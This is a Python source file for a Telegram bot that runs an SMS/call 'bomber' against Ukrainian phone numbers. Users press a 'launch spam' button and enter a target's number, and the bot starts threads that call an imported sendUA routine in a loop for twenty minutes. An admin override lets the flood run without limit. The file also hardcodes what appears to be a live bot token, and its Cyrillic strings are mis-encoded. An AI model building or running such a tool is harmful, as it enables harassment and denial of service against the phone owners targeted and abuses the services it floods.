from aiogram import Bot, Dispatcher, types, executor
from threading import Thread
import random, datetime, time
from datetime import datetime, timedelta
from bomberUA import sendUA
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton

TOKEN = '1873181031:AAFogpKvVX4J9lskIKIUVmxi8mbtXQpEwWE'

bot = Bot(TOKEN)
dp = Dispatcher(bot)

THREADS_LIMIT = 100000
running_spams_per_chat_id = []
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
ADMIN_CHAT_ID = 168

go_start = ReplyKeyboardMarkup(resize_keyboard=True)
start_attack = KeyboardButton(text='üì≤ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–ø–∞–º')
stop_attack = KeyboardButton(text='‚ùóÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ê—Ç–∞–∫—É')
go_start.add(start_attack).insert(stop_attack)

def start_spam_vip(chat_id, phone_number, force):
	running_spams_per_chat_id.append(chat_id)
	bot.send_message(chat_id, f'‚Äçüì± –ù–æ–º–µ—Ä –∂–µ—Ä—Ç–≤—ã: <code>+{phone_number}</code>\n‚è± –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: <code>20 –º–∏–Ω—É—Ç</code>\nüí• –ê—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ωa!', parse_mode='HTML')
	end = datetime.now() + timedelta(minutes = 20)
	while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
		if chat_id not in running_spams_per_chat_id:
			break
		sendUA(phone_number)
	bot.send_message(chat_id, f'<b>–°–ø–∞–º –Ω–∞ –Ω–æ–º–µ—Ä {phone_number} –∑–∞–≤–µ—Ä—à—ë–Ω</b>', parse_mode='HTML')
	THREADS_AMOUNT[0] -= 1 # —Å—Ç–æ—è–ª–æ 1
	try:
		running_spams_per_chat_id.remove(chat_id)
	except Exception:
		pass
def spam_handler_vip(phone, chat_id, force):
	if int(chat_id) in running_spams_per_chat_id:
		bot.send_message(chat_id, 'üõë –í—ã —É–∂–µ –Ω–∞—á–∞–ª–∏ —Ä–∞—Å—Å—ã–ª–∫—É —Å–ø–∞–º–∞. –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ "–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞—Ç–∞–∫—É ‚ùå" –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞')
		return

	if THREADS_AMOUNT[0] < THREADS_LIMIT:
		x = Thread(target=start_spam_vip, args=(chat_id, phone, force))
		threads.append(x)
		THREADS_AMOUNT[0] += 1
		x.start()
def start_spam(message):
	text = message.text
	chat_id = int(message.chat.id)
	if len(text) == 12:
		phone = text
		bot.send_message(message.chat.id, '–ó–∞–ø—É—Å–∫ —Å–µ—Å—Å–∏–∏ - ‚úÖ')
		spam_handler_vip(phone, chat_id, force=False)

@dp.message_handler(commands=['start', '—Å—Ç–∞—Ä—Ç'])
async def start_command(message: types.Message):
	await bot.send_message(chat_id=message.chat.id,
						   text='1',
						   parse_mode="HTML",
						   reply_markup=go_start)

@dp.message_handler(content_types=['text'])
async def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text
    if text == 'üì≤ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–ø–∞–º':
        await bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\nüá∫üá¶ 380*********\n')
        dp.register_message_handler(start_spam)
    elif text == '‚ùóÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ê—Ç–∞–∫—É':
        if chat_id not in running_spams_per_chat_id:
            await bot.send_message(chat_id, 'üõë –í—ã –µ—â–µ –Ω–µ –Ω–∞—á–∏–Ω–∞–ª–∏ —Å–ø–∞–º')
        else:
            running_spams_per_chat_id.remove(chat_id)
            await bot.send_message(chat_id, '‚úÖ –°–ø–∞–º –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω')
            if chat_id not in running_spams_per_chat_id:
                THREADS_AMOUNT[0] -= 1

if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)


